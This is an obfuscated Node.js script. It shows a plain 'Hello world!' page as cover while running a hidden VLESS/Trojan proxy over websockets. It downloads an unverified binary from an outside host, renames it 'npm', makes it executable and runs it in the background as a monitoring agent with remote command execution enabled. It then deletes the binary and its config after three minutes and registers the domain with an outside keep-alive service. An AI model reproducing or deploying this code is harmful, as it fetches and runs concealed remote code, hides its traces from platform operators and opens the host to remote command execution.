const _0x193580=_0x4a79;function _0x2e5a(){const _0x39ef5e=['Failed\x20to\x20resolve\x20','sha224','catch','NEZHA_KEY','env','then','pipe','axios','length','https://amd64.ssss.nyc.mn/v1','finish','443','http','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','readUInt16BE','NAME','replace','NEZHA_SERVER','write','npm','find','net','writeHead','https://','application/dns-json','substr','connect','crypto','config.yaml','npm\x20download\x20successfully','Hug','737967xCPnaH','reduce','utf-8','chmod\x20+x\x20npm',':443?encryption=none&security=tls&sni=','writeFileSync','utf8','2096','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','join','type','buffer','data','stream','pop','from','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','npm\x20is\x20running','NEZHA_PORT','createHash','arch','Server','WSPATH','&type=A','5uojqjD','true','get','1.1.1.1','log','text/plain','AUTO_ACCESS','slice','2109476JEgnkf',':443?security=tls&sni=','false','7554288ZNbhHk','&path=%2F','vless://','Not\x20Found\x0a','Automatic\x20Access\x20Task\x20added\x20successfully','toString','--tls','once','aarch64','npm\x20running\x20error:','trojan://','npm\x20is\x20already\x20running,\x20skip\x20running...','497157aVeQrq','includes','end','country','11690yWcDRu','setsid\x20nohup\x20./npm\x20-s\x20','message','url','https://speed.cloudflare.com/meta','createServer','/bin/bash','49d18092-831f-4343-bf0b-7292738b8e29','arm','DOMAIN','concat','Unknown','2083','UUID','trim','asOrganization','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','Answer','error','path','SUB_PATH','send','map','listen','post','close','unlink','PORT','1234.abc.com','digest','readUInt8','33246leDPVM','createWriteStream','16lFhYzm','text/html','2294826GIASyZ','185087cQkRCu','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','8.8.4.4','\x20with\x20all\x20DNS\x20servers'];_0x2e5a=function(){return _0x39ef5e;};return _0x2e5a();}(function(_0x40838d,_0x59740a){const _0x165aba=_0x4a79,_0xf7f54d=_0x40838d();while(!![]){try{const _0x2b2c64=-parseInt(_0x165aba(0x111))/0x1+-parseInt(_0x165aba(0x131))/0x2+-parseInt(_0x165aba(0x140))/0x3*(parseInt(_0x165aba(0x165))/0x4)+-parseInt(_0x165aba(0x129))/0x5*(parseInt(_0x165aba(0x167))/0x6)+parseInt(_0x165aba(0x168))/0x7+-parseInt(_0x165aba(0x134))/0x8+parseInt(_0x165aba(0x163))/0x9*(parseInt(_0x165aba(0x144))/0xa);if(_0x2b2c64===_0x59740a)break;else _0xf7f54d['push'](_0xf7f54d['shift']());}catch(_0x1b7612){_0xf7f54d['push'](_0xf7f54d['shift']());}}}(_0x2e5a,0x894d5));const os=require('os'),http=require(_0x193580(0xfe)),fs=require('fs'),axios=require(_0x193580(0x173)),net=require(_0x193580(0x107)),path=require(_0x193580(0x157)),crypto=require(_0x193580(0x10d)),{Buffer}=require(_0x193580(0x11c)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x193580(0x170)][_0x193580(0x151)]||_0x193580(0x14b),NEZHA_SERVER=process['env'][_0x193580(0x103)]||'',NEZHA_PORT=process[_0x193580(0x170)][_0x193580(0x123)]||'',NEZHA_KEY=process[_0x193580(0x170)][_0x193580(0x16f)]||'',DOMAIN=process[_0x193580(0x170)][_0x193580(0x14d)]||_0x193580(0x160),AUTO_ACCESS=process[_0x193580(0x170)][_0x193580(0x12f)]||!![],WSPATH=process[_0x193580(0x170)][_0x193580(0x127)]||UUID[_0x193580(0x130)](0x0,0x8),SUB_PATH=process['env'][_0x193580(0x158)]||'sub',NAME=process[_0x193580(0x170)][_0x193580(0x101)]||_0x193580(0x110),PORT=process[_0x193580(0x170)][_0x193580(0x15f)]||0x1eb4;function _0x4a79(_0x192ee5,_0x573dd6){const _0x2e5a86=_0x2e5a();return _0x4a79=function(_0x4a79b1,_0x4995c3){_0x4a79b1=_0x4a79b1-0xfc;let _0x4fed79=_0x2e5a86[_0x4a79b1];return _0x4fed79;},_0x4a79(_0x192ee5,_0x573dd6);}let ISP='';const GetISP=async()=>{const _0x13edaa=_0x193580;try{const _0x45dcc0=await axios[_0x13edaa(0x12b)](_0x13edaa(0x148)),_0x1879c3=_0x45dcc0[_0x13edaa(0x11d)];ISP=(_0x1879c3[_0x13edaa(0x143)]+'-'+_0x1879c3[_0x13edaa(0x153)])[_0x13edaa(0x102)](/ /g,'_');}catch(_0x49f012){ISP=_0x13edaa(0x14f);}};GetISP();const httpServer=http[_0x193580(0x149)]((_0x2a4ba8,_0x1d233e)=>{const _0x2b25a8=_0x193580;if(_0x2a4ba8[_0x2b25a8(0x147)]==='/'){const _0x24ff8b=path[_0x2b25a8(0x11a)](__dirname,'index.html');fs['readFile'](_0x24ff8b,_0x2b25a8(0x117),(_0x452cbe,_0xdabb93)=>{const _0x4a9bc6=_0x2b25a8;if(_0x452cbe){_0x1d233e[_0x4a9bc6(0x108)](0xc8,{'Content-Type':_0x4a9bc6(0x166)}),_0x1d233e[_0x4a9bc6(0x142)]('Hello\x20world!');return;}_0x1d233e[_0x4a9bc6(0x108)](0xc8,{'Content-Type':_0x4a9bc6(0x166)}),_0x1d233e['end'](_0xdabb93);});return;}else{if(_0x2a4ba8[_0x2b25a8(0x147)]==='/'+SUB_PATH){const _0x32af86=_0x2b25a8(0x136)+UUID+'@'+DOMAIN+_0x2b25a8(0x115)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x1aeb71=_0x2b25a8(0x13e)+UUID+'@'+DOMAIN+_0x2b25a8(0x132)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x2b25a8(0x135)+WSPATH+'#'+NAME+'-'+ISP,_0x5badc3=_0x32af86+'\x0a'+_0x1aeb71,_0x3caacf=Buffer[_0x2b25a8(0x120)](_0x5badc3)[_0x2b25a8(0x139)]('base64');_0x1d233e['writeHead'](0xc8,{'Content-Type':_0x2b25a8(0x12e)}),_0x1d233e[_0x2b25a8(0x142)](_0x3caacf+'\x0a');}else _0x1d233e[_0x2b25a8(0x108)](0x194,{'Content-Type':_0x2b25a8(0x12e)}),_0x1d233e['end'](_0x2b25a8(0x137));}}),wss=new WebSocket[(_0x193580(0x126))]({'server':httpServer}),uuid=UUID[_0x193580(0x102)](/-/g,''),DNS_SERVERS=[_0x193580(0x16a),_0x193580(0x12c)];function resolveHost(_0x2179f8){return new Promise((_0x5a393a,_0x47f127)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x2179f8)){_0x5a393a(_0x2179f8);return;}let _0x3cfce9=0x0;function _0x33827c(){const _0x589276=_0x4a79;if(_0x3cfce9>=DNS_SERVERS[_0x589276(0x174)]){_0x47f127(new Error(_0x589276(0x16c)+_0x2179f8+_0x589276(0x16b)));return;}const _0xd85ec=DNS_SERVERS[_0x3cfce9];_0x3cfce9++;const _0x5483fd='https://dns.google/resolve?name='+encodeURIComponent(_0x2179f8)+_0x589276(0x128);axios[_0x589276(0x12b)](_0x5483fd,{'timeout':0x1388,'headers':{'Accept':_0x589276(0x10a)}})[_0x589276(0x171)](_0x408a31=>{const _0x2c53ac=_0x589276,_0x19074e=_0x408a31[_0x2c53ac(0x11d)];if(_0x19074e['Status']===0x0&&_0x19074e[_0x2c53ac(0x155)]&&_0x19074e[_0x2c53ac(0x155)][_0x2c53ac(0x174)]>0x0){const _0xf18ac6=_0x19074e[_0x2c53ac(0x155)][_0x2c53ac(0x106)](_0x3fee36=>_0x3fee36[_0x2c53ac(0x11b)]===0x1);if(_0xf18ac6){_0x5a393a(_0xf18ac6[_0x2c53ac(0x11d)]);return;}}_0x33827c();})[_0x589276(0x16e)](_0x3560be=>{_0x33827c();});}_0x33827c();});}function handleVlessConnection(_0x522912,_0x363eb0){const _0x5ae9bd=_0x193580,[_0x455b0a]=_0x363eb0,_0x4de84c=_0x363eb0[_0x5ae9bd(0x130)](0x1,0x11);if(!_0x4de84c['every']((_0x21c921,_0x3202cc)=>_0x21c921==parseInt(uuid['substr'](_0x3202cc*0x2,0x2),0x10)))return![];let _0x589c7c=_0x363eb0[_0x5ae9bd(0x130)](0x11,0x12)[_0x5ae9bd(0x162)]()+0x13;const _0x2be6ea=_0x363eb0['slice'](_0x589c7c,_0x589c7c+=0x2)[_0x5ae9bd(0x100)](0x0),_0x153c5c=_0x363eb0[_0x5ae9bd(0x130)](_0x589c7c,_0x589c7c+=0x1)[_0x5ae9bd(0x162)](),_0x4e3f75=_0x153c5c==0x1?_0x363eb0[_0x5ae9bd(0x130)](_0x589c7c,_0x589c7c+=0x4)[_0x5ae9bd(0x11a)]('.'):_0x153c5c==0x2?new TextDecoder()['decode'](_0x363eb0['slice'](_0x589c7c+0x1,_0x589c7c+=0x1+_0x363eb0[_0x5ae9bd(0x130)](_0x589c7c,_0x589c7c+0x1)['readUInt8']())):_0x153c5c==0x3?_0x363eb0['slice'](_0x589c7c,_0x589c7c+=0x10)[_0x5ae9bd(0x112)]((_0x444f8e,_0x40977d,_0x498bac,_0x3eba4d)=>_0x498bac%0x2?_0x444f8e['concat'](_0x3eba4d['slice'](_0x498bac-0x1,_0x498bac+0x1)):_0x444f8e,[])[_0x5ae9bd(0x15a)](_0x4abbf7=>_0x4abbf7['readUInt16BE'](0x0)['toString'](0x10))['join'](':'):'';_0x522912[_0x5ae9bd(0x159)](new Uint8Array([_0x455b0a,0x0]));const _0x1ccff8=createWebSocketStream(_0x522912);return resolveHost(_0x4e3f75)[_0x5ae9bd(0x171)](_0x5abdc2=>{const _0x33d5e4=_0x5ae9bd;net[_0x33d5e4(0x10c)]({'host':_0x5abdc2,'port':_0x2be6ea},function(){const _0x1fc3df=_0x33d5e4;this[_0x1fc3df(0x104)](_0x363eb0[_0x1fc3df(0x130)](_0x589c7c)),_0x1ccff8['on'](_0x1fc3df(0x156),()=>{})[_0x1fc3df(0x172)](this)['on'](_0x1fc3df(0x156),()=>{})[_0x1fc3df(0x172)](_0x1ccff8);})['on'](_0x33d5e4(0x156),()=>{});})[_0x5ae9bd(0x16e)](_0x3367e6=>{const _0x504d0a=_0x5ae9bd;net[_0x504d0a(0x10c)]({'host':_0x4e3f75,'port':_0x2be6ea},function(){const _0x3f9188=_0x504d0a;this[_0x3f9188(0x104)](_0x363eb0[_0x3f9188(0x130)](_0x589c7c)),_0x1ccff8['on']('error',()=>{})[_0x3f9188(0x172)](this)['on'](_0x3f9188(0x156),()=>{})[_0x3f9188(0x172)](_0x1ccff8);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x142046,_0x186742){const _0x468499=_0x193580;try{if(_0x186742[_0x468499(0x174)]<0x3a)return![];const _0x5b3dd3=_0x186742['slice'](0x0,0x38)['toString'](),_0xcd5576=[UUID];let _0x34e499=null;for(const _0x3593de of _0xcd5576){const _0x22f696=crypto[_0x468499(0x124)](_0x468499(0x16d))['update'](_0x3593de)[_0x468499(0x161)]('hex');if(_0x22f696===_0x5b3dd3){_0x34e499=_0x3593de;break;}}if(!_0x34e499)return![];let _0x550046=0x38;_0x186742[_0x550046]===0xd&&_0x186742[_0x550046+0x1]===0xa&&(_0x550046+=0x2);const _0x51b34f=_0x186742[_0x550046];if(_0x51b34f!==0x1)return![];_0x550046+=0x1;const _0x469b2a=_0x186742[_0x550046];_0x550046+=0x1;let _0x2b7cb5,_0x3e6c69;if(_0x469b2a===0x1)_0x2b7cb5=_0x186742['slice'](_0x550046,_0x550046+0x4)[_0x468499(0x11a)]('.'),_0x550046+=0x4;else{if(_0x469b2a===0x3){const _0x73e0fe=_0x186742[_0x550046];_0x550046+=0x1,_0x2b7cb5=_0x186742[_0x468499(0x130)](_0x550046,_0x550046+_0x73e0fe)['toString'](),_0x550046+=_0x73e0fe;}else{if(_0x469b2a===0x4)_0x2b7cb5=_0x186742[_0x468499(0x130)](_0x550046,_0x550046+0x10)['reduce']((_0x2cb861,_0x16b161,_0x2cf9a2,_0x4e8a69)=>_0x2cf9a2%0x2?_0x2cb861[_0x468499(0x14e)](_0x4e8a69['slice'](_0x2cf9a2-0x1,_0x2cf9a2+0x1)):_0x2cb861,[])[_0x468499(0x15a)](_0x5bd307=>_0x5bd307[_0x468499(0x100)](0x0)[_0x468499(0x139)](0x10))[_0x468499(0x11a)](':'),_0x550046+=0x10;else return![];}}_0x3e6c69=_0x186742[_0x468499(0x100)](_0x550046),_0x550046+=0x2;_0x550046<_0x186742[_0x468499(0x174)]&&_0x186742[_0x550046]===0xd&&_0x186742[_0x550046+0x1]===0xa&&(_0x550046+=0x2);const _0xf74a0=createWebSocketStream(_0x142046);return resolveHost(_0x2b7cb5)[_0x468499(0x171)](_0x1152f4=>{const _0x7489a2=_0x468499;net[_0x7489a2(0x10c)]({'host':_0x1152f4,'port':_0x3e6c69},function(){const _0x48ad67=_0x7489a2;_0x550046<_0x186742[_0x48ad67(0x174)]&&this[_0x48ad67(0x104)](_0x186742[_0x48ad67(0x130)](_0x550046)),_0xf74a0['on']('error',()=>{})['pipe'](this)['on']('error',()=>{})['pipe'](_0xf74a0);})['on']('error',()=>{});})['catch'](_0x4d9371=>{const _0x309d2=_0x468499;net[_0x309d2(0x10c)]({'host':_0x2b7cb5,'port':_0x3e6c69},function(){const _0x3a84a6=_0x309d2;_0x550046<_0x186742['length']&&this[_0x3a84a6(0x104)](_0x186742[_0x3a84a6(0x130)](_0x550046)),_0xf74a0['on'](_0x3a84a6(0x156),()=>{})['pipe'](this)['on'](_0x3a84a6(0x156),()=>{})[_0x3a84a6(0x172)](_0xf74a0);})['on']('error',()=>{});}),!![];}catch(_0x5967f5){return![];}}wss['on']('connection',(_0x525c4d,_0x145d2c)=>{const _0x15bce0=_0x193580,_0x3ede15=_0x145d2c['url']||'';_0x525c4d[_0x15bce0(0x13b)](_0x15bce0(0x146),_0x1a3c5c=>{const _0x430d2a=_0x15bce0;if(_0x1a3c5c[_0x430d2a(0x174)]>0x11&&_0x1a3c5c[0x0]===0x0){const _0x99967f=_0x1a3c5c[_0x430d2a(0x130)](0x1,0x11),_0x12eb78=_0x99967f['every']((_0x121b33,_0x52f9ca)=>_0x121b33==parseInt(uuid[_0x430d2a(0x10b)](_0x52f9ca*0x2,0x2),0x10));if(_0x12eb78){!handleVlessConnection(_0x525c4d,_0x1a3c5c)&&_0x525c4d['close']();return;}}!handleTrojanConnection(_0x525c4d,_0x1a3c5c)&&_0x525c4d[_0x430d2a(0x15d)]();})['on'](_0x15bce0(0x156),()=>{});});const getDownloadUrl=()=>{const _0x5ab200=_0x193580,_0x2649f3=os[_0x5ab200(0x125)]();return _0x2649f3===_0x5ab200(0x14c)||_0x2649f3==='arm64'||_0x2649f3===_0x5ab200(0x13c)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x5ab200(0x175):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x275825=_0x193580;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0xb939f8=getDownloadUrl(),_0x22f9b9=await axios({'method':_0x275825(0x12b),'url':_0xb939f8,'responseType':_0x275825(0x11e)}),_0xec8a73=fs[_0x275825(0x164)](_0x275825(0x105));return _0x22f9b9[_0x275825(0x11d)][_0x275825(0x172)](_0xec8a73),new Promise((_0xd6b0d0,_0x1d1302)=>{const _0x1a35eb=_0x275825;_0xec8a73['on'](_0x1a35eb(0xfc),()=>{const _0x1631ca=_0x1a35eb;console[_0x1631ca(0x12d)](_0x1631ca(0x10f)),exec(_0x1631ca(0x114),_0x254cfb=>{if(_0x254cfb)_0x1d1302(_0x254cfb);_0xd6b0d0();});}),_0xec8a73['on'](_0x1a35eb(0x156),_0x1d1302);});}catch(_0x5effb1){throw _0x5effb1;}},runnz=async()=>{const _0x269959=_0x193580;try{const _0x37d3ef=execSync(_0x269959(0x119),{'encoding':_0x269959(0x113)});if(_0x37d3ef[_0x269959(0x152)]()!==''){console['log'](_0x269959(0x13f));return;}}catch(_0x54f532){}await downloadFile();let _0x4675fe='',_0x9886bc=[_0x269959(0xfd),'8443',_0x269959(0x118),'2087',_0x269959(0x150),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x8e1387=_0x9886bc[_0x269959(0x141)](NEZHA_PORT)?_0x269959(0x13a):'';_0x4675fe=_0x269959(0x145)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x8e1387+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x55b234=NEZHA_SERVER[_0x269959(0x141)](':')?NEZHA_SERVER['split'](':')[_0x269959(0x11f)]():'',_0x5641ce=_0x9886bc['includes'](_0x55b234)?_0x269959(0x12a):_0x269959(0x133),_0x4725a6='client_secret:\x20'+NEZHA_KEY+_0x269959(0x154)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x5641ce+_0x269959(0x121)+UUID;fs[_0x269959(0x116)](_0x269959(0x10e),_0x4725a6);}_0x4675fe=_0x269959(0x169);}else{console['log'](_0x269959(0xff));return;}}try{exec(_0x4675fe,{'shell':_0x269959(0x14a)},_0x3478d1=>{const _0x1eb4bd=_0x269959;if(_0x3478d1)console[_0x1eb4bd(0x156)](_0x1eb4bd(0x13d),_0x3478d1);else console[_0x1eb4bd(0x12d)](_0x1eb4bd(0x122));});}catch(_0x34db85){console[_0x269959(0x156)]('error:\x20'+_0x34db85);}};async function addAccessTask(){const _0x295daf=_0x193580;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x11e82b=_0x295daf(0x109)+DOMAIN;try{const _0x1d287f=await axios[_0x295daf(0x15c)]('https://oooo.serv00.net/add-url',{'url':_0x11e82b},{'headers':{'Content-Type':'application/json'}});console[_0x295daf(0x12d)](_0x295daf(0x138));}catch(_0x4fc373){}}const delFiles=()=>{const _0x4797aa=_0x193580;fs[_0x4797aa(0x15e)](_0x4797aa(0x105),()=>{}),fs[_0x4797aa(0x15e)]('config.yaml',()=>{});};httpServer[_0x193580(0x15b)](PORT,()=>{const _0x1db8ad=_0x193580;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x1db8ad(0x12d)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
